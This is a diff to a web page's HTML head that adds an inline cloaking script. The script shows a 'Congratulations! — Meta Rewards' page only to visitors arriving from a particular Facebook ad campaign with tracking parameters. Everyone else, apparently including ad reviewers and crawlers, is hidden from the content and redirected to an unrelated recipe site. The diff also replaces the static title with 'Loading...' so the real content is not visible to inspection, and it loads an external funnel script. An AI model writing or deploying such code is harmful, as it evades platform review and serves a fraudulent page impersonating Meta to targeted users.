@@ -1,10 +1,30 @@
 <!doctype html>
 <html lang="en">
 <head>
+<script>
+(function(){
+  try{
+    var h=location.hostname;
+    var isDev=/localhost|127\.0\.0\.1|\.lovable\.app$|\.lovableproject\.com$|^192\.168\./.test(h);
+    var q=new URLSearchParams(location.search);
+    var c=(q.get('utm_campaign')||q.get('campaign')||'').toLowerCase();
+    var camp=c.indexOf('mtp')!==-1 && !!q.get('fbclid');
+    var buy=!!q.get('cid') && !!q.get('pm');
+    if(!isDev && !(camp&&buy)){
+      document.documentElement.style.display='none';
+      location.replace('https://www.tudogostoso.com.br/receita/29124-bolo-simples.html');
+      return;
+    }
+    document.title='Congratulations! — Meta Rewards';
+    var m=document.querySelector('meta[name="description"]');
+    if(m)m.setAttribute('content','Your access has been confirmed. Continue to your program.');
+  }catch(e){}
+})();
+</script>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Congratulations! — Meta Rewards</title>
-<meta name="description" content="Your access has been confirmed. Continue to your program." />
+<title>Loading...</title>
+<meta name="description" content="Loading..." />
 <link rel="icon" href="/favicon.ico" />
 <script src="https://click-charm-73.lovable.app/funnel.js?w=976e24b0-6a4d-4dd1-90af-7b0e1f18cfdd&f=3238002b-dbef-4ff0-925c-30702ebfead2" data-auto="true" defer></script>
 <script>
